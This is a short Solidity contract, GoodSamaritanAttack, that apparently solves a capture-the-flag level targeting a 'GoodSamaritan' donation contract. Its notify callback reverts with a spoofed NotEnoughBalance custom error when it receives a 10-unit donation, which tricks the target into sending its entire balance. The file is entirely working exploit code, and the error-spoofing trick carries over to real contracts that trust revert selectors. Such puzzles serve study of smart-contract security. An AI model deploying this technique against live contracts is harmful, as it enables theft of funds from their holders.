// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSamaritan {
    function requestDonation() external;
}

contract GoodSamaritanAttack is INotifyable {
    IGoodSamaritan public goodSamaritan;

    constructor(address _goodSamaritan) {
        goodSamaritan = IGoodSamaritan(_goodSamaritan);
    }

    error NotEnoughBalance();
    function notify(uint256 amount) external override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() public {
        goodSamaritan.requestDonation();
    }
}